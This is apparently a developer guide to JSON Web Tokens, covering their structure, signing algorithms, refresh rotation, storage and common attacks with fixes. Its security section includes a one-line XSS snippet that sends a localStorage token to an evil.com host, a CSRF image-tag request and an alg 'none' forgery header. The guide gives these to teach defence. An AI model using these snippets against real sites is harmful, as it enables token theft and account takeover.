# JSON Web Token (JWT): The Complete Developer Guide
> A comprehensive, production-grade guide to understanding, implementing, and securing JSON Web Tokens. From first principles to enterprise architecture.

- [Introduction](#introduction)
- [Authentication Basics](#authentication-basics)
- [History of JWT](#history-of-jwt)
- [JWT Structure](#jwt-structure)
- [JWT Claims](#jwt-claims)
- [JWT Signing Algorithms](#jwt-signing-algorithms)
- [How JWT Authentication Works](#how-jwt-authentication-works)
- [Access Token](#access-token)
- [Refresh Token](#refresh-token)
- [Token Storage](#token-storage)
- [Security Risks](#security-risks)
- [Best Practices](#best-practices)
- [Building Authentication](#building-authentication)
- [Common Mistakes](#common-mistakes)
- [Frequently Asked Questions](#frequently-asked-questions)
- [Interview Questions](#interview-questions)
- [Cheat Sheet](#cheat-sheet)
- [Resources](#-resources)

---

# Introduction
## **What is JWT?**
**JSON Web Token (JWT)** is a compact, URL-safe, self-contained token format defined by RFC 7519. It is used to securely transmit information between two parties as a JSON object. The information inside a JWT is digitally signed using a secret (HMAC) or a public/private key pair (RSA, ECDSA, EdDSA), which guarantees that the data has not been tampered with and that the sender is who they claim to be.

A **JWT** looks like this:
```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```
Three base64url-encoded strings separated by two dots. Simple on the outside, powerful on the inside.
> 💡 **Note**: JWT is a token format, not an authentication protocol. It is the container used inside many authentication and authorization systems. 

## **Why JWT Was Created**
Before JWT, authentication and information exchange between systems relied on:
* **Custom token formats** that worked only within a specific product
* **SAML (Security Assertion Markup Language)** which is powerful but XML-heavy and complex
* **Simple API keys** that didn't carry identity or claims
* **Server-side sessions** which scale poorly across distributed systems

The IETF needed a lightweight, language-agnostic, JSON-based standard that could:
1. Be signed and optionally encrypted
2. Carry arbitrary claims
3. Be used across different platforms (web, mobile, IoT, services)
4. Be verified without a database lookup (stateless)
JWT was the answer.

## **Problems JWT Solves**
| **Problem** | **How JWT Solves It** |
|:------------|:----------------------|
| **Distributed authentication across microservices** | Tokens are self-contained and can be verified by any service using the same secret key (HS256) or a public key (RS256/ES256), eliminating the need for centralized session storage. |
| **Mobile app authentication** | JWTs are compact, lightweight, and easily transmitted in the `Authorization: Bearer <token>` header, making them ideal for mobile applications. |
| **Federated identity** | JWT claims securely carry user identity and attributes, allowing services to trust authenticated user information without repeatedly querying the identity provider. |
| **Single Sign-On (SSO)** | A single JWT issued after authentication can be accepted by multiple trusted applications, enabling seamless access across services. |
| **API authorization** | Each request includes a signed JWT containing user roles, permissions, and scopes, allowing APIs to authorize access without maintaining server-side sessions. |
| **Offline verification** | Since JWTs are digitally signed, their integrity and authenticity can be verified locally without requiring a database lookup or communication with the authentication server. |

## **When NOT to Use JWT**
JWT is **not** a silver bullet. Avoid it when:
* ❌ **You need immediate revocation at scale**. JWTs are stateless — revoking one mid-lifetime requires blocklists, defeating the purpose.
* ❌ **Your system is monolithic with a single backend**. Traditional server-side sessions are simpler and safer.
* **You need to hide the data**. JWT is signed, not encrypted by default. Anyone can decode the payload.
* ❌ **Your tokens would be huge**. Storing claims bloats every request and bloats bandwidth.
❌ **You need fine-grained, real-time permission checks**. Use server-side authorization per request instead.
> ⚠️ Warning: Many teams adopt JWT because it sounds modern. Often, server-side sessions with Redis are simpler, more secure, and easier to revoke.
**Key Takeaways**
- JWT is a compact, signed, JSON-based token format.
- It enables stateless verification across services.
- It is signed, not encrypted — payloads are visible.
- Use it only when its strengths match your architecture.

---

# Authentication Basics
Before diving into JWT, you need a solid understanding of the concepts around it.

## Authentication
**Authentication** is the process of proving who you are. When you log in with a username and password, you are authenticating.
<p align="center">
  <img src="./src/image/Authentication.svg" alt="Authentication diagram" width="500">
</p>

## Authorization
**Authorization** is the process of determining what you are allowed to do. After authentication, the system decides which resources you can access.
<p align="center">
  <img src="./src/image/Authorization.svg" alt="Authorization diagram" width="500">
</p>

> 💡 Analogy: Authentication is showing your ID at the airport. Authorization is the boarding pass telling you which gate you can enter. 

## Identity
**Identity** is the set of attributes that uniquely describes a user — username, email, ID, roles, etc.

## Sessions
A **session** is a server-side mechanism where the server stores user state (e.g., "user 42 is logged in") and gives the client a session ID (often in a cookie). The server then looks up the session on every request.

<p align="center">
  <img src="./src/image/Sessions.svg" alt="Sessions diagram" width="500">
</p>

**Cookies** are small key-value pairs the browser stores and sends automatically with every request to the same domain.

| **Cookie Attribute** | **Purpose** |
|:---------------------|:------------|
| **HttpOnly** | Prevents JavaScript from accessing the cookie, reducing the risk of theft through Cross-Site Scripting (XSS) attacks. |
| **Secure** | Ensures the cookie is transmitted only over encrypted HTTPS connections, protecting it from interception on insecure networks. |
| **SameSite** | Mitigates Cross-Site Request Forgery (CSRF) attacks by controlling when cookies are included in cross-site requests (`Strict`, `Lax`, or `None`). |
| **Max-Age / Expires** | Defines how long the cookie remains valid before it is automatically deleted by the browser. |
| **Path / Domain** | Restricts where the cookie is sent, allowing developers to limit it to specific paths or domains for better security and scope control. |

## Stateless Authentication
In **stateless authentication**, the server stores no session data. Every request carries everything the server needs to verify the user (typically a JWT).

<p align="center">
  <img src="./src/image/Stateless Authentication.svg" alt="Stateless Authentication" width="500">
</p>

> 💡 Analogy: A session is like a coat check — you hand over your coat and get a ticket. A JWT is like a boarding pass printed with your name, seat, and gate — anyone with the right equipment (the airport's signing keys) can verify it without checking a central database. 

**Key Takeaways**
- Authentication verifies identity; authorization verifies permissions.
- Sessions are server-side state; JWTs are client-side, stateless credentials.
- Cookies are the default transport for sessions but can also carry JWTs.

---

# History of JWT
## RFC 7519
JWT was formalized in RFC 7519, published in May 2015 by the IETF. The RFC defines:
- The token structure
- Standard claims ( iss, sub, aud, exp, nbf, iat, jti)
- Validation rules
- Use cases
## JOSE
JOSE stands for **Javascript Object Signing and Encryption**. It is the family of specifications that defines how JSON-based security tokens work.

| **Specification** | **Purpose** |
|:------------------|:------------|
| **JWS (RFC 7515)** | **JSON Web Signature** — Defines how JSON-based payloads are digitally signed to guarantee authenticity and integrity. |
| **JWE (RFC 7516)** | **JSON Web Encryption** — Defines how JSON-based payloads are encrypted to ensure confidentiality. |
| **JWK (RFC 7517)** | **JSON Web Key** — Specifies a standardized JSON format for representing cryptographic keys used for signing and encryption. |
| **JWA (RFC 7518)** | **JSON Web Algorithms** — Defines the registry of cryptographic algorithms used for signing, encryption, hashing, and key management. |
| **JWT (RFC 7519)** | **JSON Web Token** — Defines the compact, URL-safe token format used to securely transmit claims between parties. |

## Why JWT Became Popular
1. **Microservices boom** — distributed services needed a way to trust each other without central session storage.
2. **Mobile revolution** — native apps need header-based auth, not browser cookies.
3. **OAuth 2.0 and OIDC adoption** — both rely on JWT for ID tokens and access tokens.
4. **Lightweight** — easy to parse, easy to debug, easy to generate.
5. **Libraries everywhere** — every language has mature JWT libraries.
**Key Takeaways**
* JWT is a 2015 IETF standard, backed by the broader JOSE family.
* It became the de-facto token format for OAuth 2.0, OIDC, and modern APIs.

---

# JWT Structure
A JWT consists of three parts, separated by dots:
```bash
HEADER.PAYLOAD.SIGNATURE
```
Each part is **Base64URL** encoded (not Base64, not encrypted).

## The Three Parts Explained
1. **Header**
The header contains metadata about the token — specifically, the signing algorithm and the token type.

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
Encoded:
```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```
2. **Payload**
The payload contains the claims — the data you want to transmit.
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
```
Encoded:
```bash
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ
```
3. **Signature**
The signature is computed over the encoded header and payload using the algorithm specified in the header.

For HS256:
```text
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```
Result:
```bash
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

## Base64URL Encoding
Standard Base64 uses +, /, and = — characters that are problematic in URLs and filenames. Base64URL replaces them:

| **Feature** | **Base64** | **Base64URL** |
|:------------|:----------:|:-------------:|
| `+` character | ✅ Used | ❌ Replaced with `-` |
| `/` character | ✅ Used | ❌ Replaced with `_` |
| `=` padding | ✅ Used | ❌ Removed (optional) |
| URL-safe | ❌ No | ✅ Yes |
| Filename-safe | ❌ No | ✅ Yes |
| Used in JWT | ❌ No | ✅ Yes |

> 💡 **Why**? JWTs are designed to be used in URLs, HTTP headers, and cookies. Padding characters ( =) can be misinterpreted, and +/ / have special meaning in URLs. 

## Why JWT Is NOT Encrypted
A signed JWT only guarantees **integrity and authenticity** — that the token was created by a trusted party and hasn't been tampered with. **Anyone** who has the token can decode the payload and read it.
> ⚠️ **Warning**: Never put sensitive data (passwords, credit cards, SSNs, PII) in a JWT payload. It is base64, not encryption.
If you need confidentiality, use **JWE** (JSON Web Encryption) instead, or keep the data server-side and store only the ID in the JWT.

## Decode a Real JWT Manually
Take this token:
```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Step 1: Split**
```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```
**Step 2: Base64URL decode each part**

Header → {"alg":"HS256","typ":"JWT"}
Payload → {"sub":"1234567890","name":"John Doe","iat":1516239022}
Signature → binary that we can verify with the secret.

You can do this with any JWT decoder like jwt.io or the CLI:
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | tr '_-' '/+' | base64 -d
```
**Key Takeaways**
* A JWT has three parts: header, payload, signature.
* All three parts are Base64URL encoded — not encrypted.
* The signature proves authenticity and integrity.
* Anyone with the token can read the payload.

---

# JWT Claims
Claims are the key-value pairs inside the payload. There are three categories.

1. **Registered Claims (Standard)**
Defined by RFC 7519. Recommended but optional.
| Claim | Full Name | Description | Example |
|-------|-----------|-------------|---------|
| `iss` | Issuer | Who issued the token | `"https://auth.example.com"` |
| `sub` | Subject | The user/entity the token represents | `"user_42"` |
| `aud` | Audience | Intended recipient(s) | `"https://api.example.com"` |
| `exp` | Expiration Time | Token expiry (Unix seconds) | `1718000000` |
| `iat` | Issued At | Token creation time | `1717996400` |
| `nbf` | Not Before | Token valid from this time | `1717996400` |
| `jti` | JWT ID | Unique token identifier | `"f9b1c2..."` |

**Real Examples**
```json
{
  "iss": "https://auth.acme.com",
  "sub": "user_1234",
  "aud": ["https://api.acme.com", "https://reports.acme.com"],
  "exp": 1718000000,
  "iat": 1717996400,
  "nbf": 1717996400,
  "jti": "550e8400-e29b-41d4-a716-446655440000"
}
```
2. **Public Claims**
Custom claims that are meant to be shared publicly. They should be:
* Collision-resistant
* Namespaced (e.g., https://acme.com/role)
```json
{
  "https://acme.com/role": "admin",
  "https://acme.com/plan": "premium"
}
```
> 💡 Tip: Use URIs or short prefixed names like acme_role to avoid colliding with future standard claims.

3. **Private Claims**
Custom claims agreed upon between the issuer and the consumer. Used internally.
```json
{
  "user_id": 42,
  "email": "user@example.com",
  "role": "editor",
  "subscription_level": 3
}
```
>⚠️ **Warning**: Don't put PII, secrets, or sensitive business logic in private claims.

**Key Takeaways**
* Use standard claims whenever possible — they are validated by libraries.
* Namespace your public claims to avoid collisions.
* Keep private claims minimal and non-sensitive.

---

# JWT Signing Algorithms
The algorithm is declared in the header's alg field. JWT supports three families.

## HMAC-based (Symmetric)
Same secret signs and verifies. Best for single-service systems where the same service signs and verifies tokens.

| Algorithm | Hash | Output bits |
|-----------|------|-------------|
| HS256 | SHA-256 | 256 |
| HS384 | SHA-384 | 384 |
| HS512 | SHA-512 | 512 |
```javascript
const jwt = require('jsonwebtoken');
const token = jwt.sign({ sub: '42' }, 'my-secret', { algorithm: 'HS256' });
```
**Pros**:
* Very fast
* Simple to implement
* Small output

**Cons**:
* Secret must be shared with every verifier
* If the secret leaks, attackers can sign any token

## RSA-based (Asymmetric)
Private key signs, public key verifies. Best for **multi-service** systems.

| Algorithm | Hash |
|-----------|------|
| RS256 | SHA-256 |
| RS384 | SHA-384 |
| RS512 | SHA-512 |
```javascript
const jwt = require('jsonwebtoken');
const fs = require('fs');

const privateKey = fs.readFileSync('private.pem');
const publicKey = fs.readFileSync('public.pem');

const token = jwt.sign({ sub: '42' }, privateKey, { algorithm: 'RS256' });
const payload = jwt.verify(token, publicKey);
```

**Pros**:
* Only the auth service holds the private key
* Verifiers need only the public key
* Easier to revoke a compromised private key

**Cons**:
* Larger signatures (~256 bytes vs ~32)
* Slower than HMAC
* CPU-intensive for very high QPS

## ECDSA (Elliptic Curve)
Asymmetric, but with smaller keys and faster verification than RSA.
| Algorithm | Curve |
|-----------|-------|
| ES256 | P-256 |
| ES384 | P-384 |
| ES512 | P-512 |

**Pros**:
* Short signatures
* Fast verification
* Smaller keys

**Cons**:
* Slightly more complex
* Some legacy systems don't support it

## EdDSA
Modern elliptic-curve signature using **Ed25519** or **Ed448**.
```javascript
const token = jwt.sign({ sub: '42' }, privateKey, { algorithm: 'EdDSA' });
```

**Pros**:
* Fastest asymmetric signing/verifying
* Very small signatures
* Strong security guarantees
* Resistant to side-channel attacks

**Cons**:
* Newer; some libraries have limited support

**Comparison Table**
| Algorithm | Type | Key Size | Signature Size | Speed | Use Case |
|-----------|------|----------|----------------|-------|----------|
| HS256 | Symmetric | 256-bit secret | ~43 bytes | ⚡ Fastest | Single service |
| HS512 | Symmetric | 512-bit secret | ~86 bytes | ⚡ Fast | Single service, higher margin |
| RS256 | Asymmetric | 2048+ bits | ~256 bytes | 🐢 Slow | Microservices, OAuth |
| ES256 | Asymmetric | 256 bits | ~64 bytes | 🚀 Fast | Modern APIs |
| EdDSA | Asymmetric | 256 bits | ~64 bytes | 🚀⚡ Fastest | New systems |

**When to Use Each**
* **HS256/HS512**: Internal APIs, single-team monoliths, microservices that sign and verify themselves.
* **RS256/ES256**: Multi-party systems where verifiers shouldn't be able to sign.
* **EdDSA**: New systems prioritizing performance and security.

>💡 Tip: Always restrict accepted algorithms server-side. Never trust the alg field in the header blindly — this is the source of the famous "algorithm confusion" attack.

**Key Takeaways**
* HMAC for single-trust systems; asymmetric for multi-trust.
* EdDSA is the modern choice for new systems.
* Always restrict allowed algorithms explicitly in your verification logic.

---

# How JWT Authentication Works
A complete authentication flow involves several endpoints. Let's walk through each one.

## Registration
The user creates an account.
<p align="center">
  <img src="./src/image/Registration.svg" alt="Registration" width="500">
</p>

## Login
The user authenticates and receives tokens.
<p align="center">
  <img src="./src/image/Login.svg" alt="Registration" width="500">
</p>

## Token Generation
```typescript
function generateTokens(userId: string, role: string) {
  const accessToken = jwt.sign(
    { sub: userId, role },
    process.env.JWT_ACCESS_SECRET!,
    { algorithm: 'HS256', expiresIn: '15m' }
  );

  const refreshToken = jwt.sign(
    { sub: userId, jti: randomUUID() },
    process.env.JWT_REFRESH_SECRET!,
    { algorithm: 'HS256', expiresIn: '7d' }
  );

  return { accessToken, refreshToken };
}
```
## Verification
When the client sends a request:
```typescript
function authMiddleware(req, res, next) {
  const header = req.headers.authorization;
  if (!header?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Missing token' });
  }
  const token = header.slice(7);

  try {
    const payload = jwt.verify(token, process.env.JWT_ACCESS_SECRET!, {
      algorithms: ['HS256'],
      issuer: 'auth.acme.com',
      audience: 'api.acme.com',
    });
    req.user = payload;
    next();
  } catch (err) {
    return res.status(401).json({ error: 'Invalid token' });
  }
}
```
## Protected Routes
```typescript
app.get('/api/profile', authMiddleware, (req, res) => {
  res.json({ userId: req.user.sub });
});
```
## Refresh Flow
When the access token expires, the client uses the refresh token to get a new pair.
<p align="center">
  <img src="./src/image/Refresh Flow.svg" alt="Registration" width="500">
</p>

## Logout

```typescript
app.post('/auth/logout', authMiddleware, async (req, res) => {
  const jti = req.user.jti;
  await db.refreshToken.update({ where: { jti }, data: { revoked: true } });
  res.clearCookie('refreshToken');
  res.json({ ok: true });
});
```
**Key Takeaways**
* JWT auth has four endpoints: register, login, refresh, logout.
* Always validate the token server-side using the secret/public key.
* Refresh tokens should be tracked server-side for rotation and revocation.

---

# Access Token
**Definition**
An **access token** is a short-lived credential that authorizes the client to access protected resources. It is sent with every API request.

## Lifecycle
<p align="center">
  <img src="./src/image/Lifecycle.svg" alt="Registration" width="500">
</p>

## Expiration
Typical lifetimes:
| App Type | Access Token Lifetime |
|----------|----------------------|
| Banking | 1–5 minutes |
| SaaS dashboard | 5–15 minutes |
| Public API | 15–60 minutes |
| Mobile app | 1 hour |
> 💡 Tip: Shorter is safer. Use refresh tokens to avoid forcing the user to log in often.

## Usage
Sent in the Authorization header:
```bash
GET /api/users/me
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

## Security
* Treat it like a password.
* Never log it.
* Never expose it in URLs.
* Never store it in localStorage if XSS is a concern — prefer HttpOnly cookies or memory storage.

**Key Takeaways**
* Access tokens are short-lived, stateless, and sent with every API call.
* Lifetime is a security/UX trade-off.
* Keep them out of logs, URLs, and vulnerable storage.

---

# Refresh Token
**Definition**
A **refresh token** is a long-lived credential used to obtain new access tokens without forcing the user to re-authenticate.

## Lifecycle
<p align="center">
  <img src="./src/image/Lifecycle-2.svg" alt="Registration" width="500">
</p>

## Rotation
**Token rotation** means issuing a new refresh token every time the old one is used. The old one is invalidated.
```typescript
async function rotateRefreshToken(oldToken: string) {
  const payload = jwt.verify(oldToken, REFRESH_SECRET);
  const stored = await db.refreshToken.findUnique({ where: { jti: payload.jti } });

  if (!stored || stored.used || stored.revoked) {
    // Reuse detected!
    await revokeAllUserTokens(payload.sub);
    throw new Error('Refresh token reuse detected');
  }

  await db.refreshToken.update({
    where: { jti: payload.jti },
    data: { used: true },
  });

  return issueNewTokenPair(payload.sub);
}
```

## Reuse Detection
If an attacker steals a refresh token and uses it after the legitimate user has already rotated it, you detect this and revoke the entire family.
<p align="center">
  <img src="./src/image/reuse detection.svg" alt="Registration" width="500">
</p>

## Revocation
Because refresh tokens are stored server-side, you can revoke them at any time:
```typescript
await db.refreshToken.updateMany({
  where: { userId, revoked: false },
  data: { revoked: true },
});
```
## Best Practices
* ✅ Store refresh tokens in a database with jti, userId, used, revoked, expiresAt.
* ✅ Use unique jti per refresh token.
* ✅ Rotate on every use.
* ✅ Detect reuse and revoke the entire chain.
* ✅ Set realistic lifetimes (7–30 days).
* ✅ Bind refresh tokens to the user agent (device fingerprint or rotation chain).

**Key Takeaways**
* Refresh tokens are long-lived but must be tracked server-side.
* Rotation + reuse detection is essential.
* They are the primary mechanism for revoking JWT sessions.

---

# Token Storage
Where you store the JWT on the client is one of the most security-critical decisions you make.

## The Options
| Storage | XSS Safe | CSRF Safe | Lifetime | JS Accessible | Best For |
|---------|----------|-----------|----------|---------------|----------|
| `HttpOnly` Cookie | ✅ Yes | ⚠️ Needs `SameSite` | Configurable | ❌ No | Production web apps |
| `Secure` Cookie | ✅ Yes | ⚠️ Needs `SameSite` | Configurable | ❌ No | HTTPS-only |
| `localStorage` | ❌ No | ✅ Yes | Persistent | ✅ Yes | ❌ Avoid |
| `sessionStorage` | ❌ No | ✅ Yes | Tab lifetime | ✅ Yes | ❌ Avoid |
| Memory (JS variable) | ✅ Yes | ✅ Yes | Page lifetime | ✅ Yes | SPAs with silent refresh |
| `IndexedDB` | ❌ No | ✅ Yes | Persistent | ✅ Yes | ❌ Avoid for tokens |

## Comparison
HttpOnly **Cookies**
```typescript
res.cookie('accessToken', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 15 * 60 * 1000,
  path: '/',
});
```
* ✅ Immune to XSS (JS can't read)
* ⚠️ Vulnerable to CSRF (mitigate with SameSite=Strict + CSRF tokens)
* ✅ Sent automatically by browser

localStorage
```javascript
localStorage.setItem('token', token);
```
* ❌ Vulnerable to XSS — any injected script can steal it
* ✅ Not vulnerable to CSRF (must be explicitly attached)
* ❌ Persistent — survives even after closing the browser
> ⚠️ **Warning**: Storing access tokens in localStorage is the single most common JWT mistake. Any XSS = total account takeover. 
sessionStorage
* Same XSS risk as localStorage
* Cleared when tab closes — slightly better

## Memory
```javascript
let accessToken = null;

async function login() {
  const res = await fetch('/auth/login', { method: 'POST', body: ... });
  const data = await res.json();
  accessToken = data.accessToken;
}
```
* ✅ Immune to XSS exfiltration (not persisted)
* ✅ Immune to CSRF
* ❌ Lost on page refresh — requires silent refresh

IndexedDB
* Same XSS risk as localStorage
* More complex — no benefit over cookies for token storage

## Modern Production Approach
The recommended approach for production web apps:
1. **Access token**: stored in memory (JS variable) or HttpOnly cookie.
2. **Refresh token**: stored in HttpOnly, Secure, SameSite=Strict cookie.

For SPAs:
1. **Access token**: memory only.
2. **Refresh token**: HttpOnly cookie.
3. Use a silent refresh endpoint on app load.

**Key Takeaways**
* Never use localStorage for access tokens in production.
* HttpOnly cookies + SameSite=Strict + CSRF tokens is the most battle-tested combo.
* Memory storage + silent refresh is ideal for SPAs.

---

# Security Risks
This section covers every major JWT attack and how to prevent it.

1. **XSS (Cross-Site Scripting)**
**Attack**: An attacker injects JS into your page and reads the JWT from localStorage or from a non- HttpOnly cookie.
```javascript
// Injected script
fetch('https://evil.com/steal?t=' + localStorage.getItem('token'));
```
**Prevention**:

* Store tokens in HttpOnly cookies or memory.
* Use a strict CSP (Content Security Policy).
* Sanitize all user input.
* Use frameworks that auto-escape (React, Vue, Angular).

2. **CSRF (Cross-Site Request Forgery)**
**Attack**: A malicious site makes the browser send a request to your API using the victim's cookie.
```html
<!-- evil.com -->
<img src="https://api.acme.com/transfer?to=attacker&amount=1000" />
```
**Prevention**:

* Set SameSite=Strict or Lax on cookies.
* Require custom headers ( X-CSRF-Token).
* Use double-submit cookie pattern.
* Verify Origin / Referer headers.

3. **Replay Attacks**
**Attack**: An attacker captures a valid JWT and reuses it.
**Prevention**:

* Use short expiration.
* Use jti and store used tokens in a Redis blocklist (with TTL = token remaining lifetime).
* Bind tokens to session context (IP, user-agent fingerprint).

4. **MITM (Man-in-the-Middle)**
**Attack**: Attacker intercepts traffic between client and server.
**Prevention**:

* Always use HTTPS.
* Use HSTS (HTTP Strict Transport Security).
* Pin certificates in mobile apps.

5. **Algorithm Confusion**
**Attack**: Server uses RS256 (asymmetric) but a library verifies any algorithm specified in the token's alg header. Attacker crafts a token with alg: "none" or alg: "HS256" using the public key as the secret.
```json
{
  "alg": "none",
  "typ": "JWT"
}
```
**Prevention**:

* Always specify allowed algorithms explicitly:
```typescript
jwt.verify(token, publicKey, { algorithms: ['RS256'] });
```
* Never trust the alg from the header.
* Reject alg: "none" explicitly.

6. **Token Theft**
**Attack**: Token leaks via logs, error reports, screenshots, version control.
Prevention:

* Never log tokens.
* Mask tokens in error tracking (Sentry, Datadog).
* Add tokens to .gitignore patterns.
* Educate developers.

7. **Brute Force**
**Attack**: Attacker tries many tokens to find a valid one.
**Prevention**:

* Use cryptographically random secrets (≥256 bits for HS256).
* Use rate limiting on auth endpoints.
* Use short token lifetimes.

8. **Weak Secrets**
**Attack**: JWT_SECRET="secret123" — attacker brute-forces HMAC.
**Prevention**:

* Generate with crypto.randomBytes(64).toString('hex').
* Use secret managers (AWS Secrets Manager, HashiCorp Vault).
* Rotate periodically.

9. **Leaked Secrets**
**Attack**: .env file committed to public GitHub repo.
**Prevention**:

* Use .gitignore.
* Use secret scanning tools ( gitleaks, truffleHog).
* Use environment variables in production, not files.

10. **JWT Disclosure**
Attack: Token leaked via Referer header when user clicks external link.
**Prevention**:

* Put JWT in Authorization header, not URL.
* Add ```html
<meta name="referrer" content="no-referrer">.```

11. **Privilege Escalation**
**Attack**: User modifies role claim in payload and signs with the public key (algorithm confusion), or sends an old admin token.
**Prevention**:

* Never trust claims without signature verification.
* Always re-check authorization server-side, not just from claims.

12. **Broken Access Control**
**Attack**: Token has sub: "42" but user modifies it to sub: "1" (admin).
**Prevention**:

* This is impossible if signatures are verified. Always verify.

13. **Side-channel Attacks on HMAC**
**Attack**: Timing attacks to discover the secret byte-by-byte.
**Prevention**:

* Use constant-time comparison (built into modern JWT libraries).

**Key Takeaways**
* JWT security is mostly about how you handle the token, not the token itself.
* Always validate algorithm explicitly.
* Always use HTTPS.
* Store tokens safely.
* Keep secrets strong and out of git.

---

# Best Practices 
**Transport & Cookies**
* ✅ **Always HTTPS**. Use HSTS.
* ✅ **HttpOnly + Secure + SameSite=Strict** for cookies.
* ✅ **Separate secrets** for access and refresh tokens.
**Token Strategy**
* ✅ **Short-lived access tokens** (5–15 min).
* ✅ **Long-lived refresh tokens** (7–30 days).
* ✅ **Refresh token rotation** with reuse detection.
* ✅ **Token binding** (optional: bind to device fingerprint).
**Secret Management**
* ✅ Store secrets in **environment variables** or secret managers.
* ✅ **Rotate secrets** periodically.
* ✅ Use different secrets per environment (dev, staging, prod).
* ✅ Never commit secrets to version control.
**Validation**
* ✅ Validate iss (issuer).
* ✅ Validate aud (audience).
* ✅ Validate exp (expiration).
* ✅ Validate nbf (not before).
* ✅ Allow **clock skew** of ~30 seconds:
```typescript
jwt.verify(token, secret, { clockTolerance: 30 });
```
**Authorization**
* ✅ Implement **RBAC** (Role-Based Access Control):
```typescript
function requireRole(role: string) {
  return (req, res, next) => {
    if (req.user.role !== role) return res.status(403).json({ error: 'Forbidden' });
    next();
  };
}

app.delete('/api/users/:id', authMiddleware, requireRole('admin'), handler);
```
* ✅ Use **scopes** for fine-grained permissions:
```json
{ "scope": "read:users write:users" }
```
**Password Hashing**
> 💡 JWT doesn't replace password hashing. You still need to securely hash passwords.
```typescript
import argon2 from 'argon2';

// Hash
const hash = await argon2.hash(password, {
  type: argon2.argon2id,
  memoryCost: 65536, // 64 MB
  timeCost: 3,
  parallelism: 4,
});

// Verify
const valid = await argon2.verify(hash, password);
```
Alternative: bcrypt (older, still acceptable).
**Rate Limiting**
```typescript
import rateLimit from 'express-rate-limit';

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  message: 'Too many login attempts',
});

app.post('/auth/login', authLimiter, loginHandler);
```
**Monitoring & Logging**
* ✅ Log auth events (login, logout, failed attempts, refresh, revocation).
* ✅ Alert on suspicious patterns (multiple failed logins, impossible travel, refresh reuse).
* ✅ Mask tokens in all logs.

**Key Rotation**
For RSA/ECDSA:
```typescript
const keys = {
  current: publicKeyCurrent,
  previous: publicKeyPrevious, // still accepted for grace period
};

function getKey(header, callback) {
  if (header.kid === 'current') return callback(null, publicKeyCurrent);
  if (header.kid === 'previous') return callback(null, publicKeyPrevious);
  callback(new Error('Unknown key'));
}
```
**Key Takeaways**
* Treat JWT like production-grade crypto: strict validation, rotation, monitoring.
* Pair JWT with strong password hashing (Argon2id).
* Rate-limit, log, and audit everything.

---

# Building Production Authentication
## Microservices Architecture
<p align="center">
  <img src="./src/image/Microservices Architecture.svg" alt="Registration" width="500">
</p>

## OAuth 2.0 & OpenID Connect
JWT is the token format for:
* **OAuth 2.0 access tokens** (sometimes)
* **OIDC ID tokens** (always — by spec)
<p align="center">
  <img src="./src/image/OAuth 2.0.svg" alt="Registration" width="500">
</p>

**RBAC (Role-Based Access Control)**
```typescript
type Role = 'admin' | 'editor' | 'viewer';

const PERMISSIONS: Record<Role, string[]> = {
  admin: ['users:read', 'users:write', 'orders:read', 'orders:write'],
  editor: ['orders:read', 'orders:write'],
  viewer: ['orders:read'],
};

function can(role: Role, permission: string): boolean {
  return PERMISSIONS[role].includes(permission);
}
```
**Scopes**
| Layer | Use |
|-------|-----|
| Edge / Gateway | Verify JWT, attach user info to headers |
| Microservices | Trust the gateway's verification; no re-verification needed |
| B2B APIs | Issue JWTs as API keys with embedded scopes |
| SSO | Issue ID tokens (JWT) across multiple apps |

**Key Takeaways**

* JWT is the glue of modern auth architectures.
* Combine with OAuth 2.0 / OIDC for standards-based SSO.
* Centralize verification at the gateway.
* Use RBAC + scopes for authorization.

---

# Common Mistakes
The top 30 mistakes developers make with JWT.
| # | Mistake | Why It's Wrong | Correct Approach |
|---|---------|----------------|------------------|
| 1 | Storing JWT in `localStorage` | XSS = total account takeover | Use `HttpOnly` cookies or memory |
| 2 | Trusting `alg` from header | Algorithm confusion attack | Always specify allowed algorithms |
| 3 | Using `alg: "none"` | Anyone can forge tokens | Reject `none` |
| 4 | Weak secret (`"secret"`) | Brute force in seconds | Use ≥256-bit random secret |
| 5 | Committing secrets to git | Public exposure | Use secret managers |
| 6 | Not validating `exp` | Tokens never expire | Always verify expiration |
| 7 | Not validating `iss` | Tokens from other issuers accepted | Validate issuer |
| 8 | Not validating `aud` | Token reuse across services | Validate audience |
| 9 | Long-lived access tokens | Long window for theft | 5–15 minutes |
| 10 | No refresh token rotation | Stolen tokens valid for days | Rotate on every use |
| 11 | No refresh token reuse detection | Stolen token works forever | Detect & revoke chain |
| 12 | Putting PII in payload | Visible to anyone | Minimize payload |
| 13 | Logging tokens | Token leaks in logs | Mask tokens |
| 14 | Putting tokens in URLs | Logged in proxy, browser history | Use `Authorization` header |
| 15 | Same secret for access & refresh | Both tokens compromised at once | Separate secrets |
| 16 | No HTTPS | MITM attacks | Always TLS |
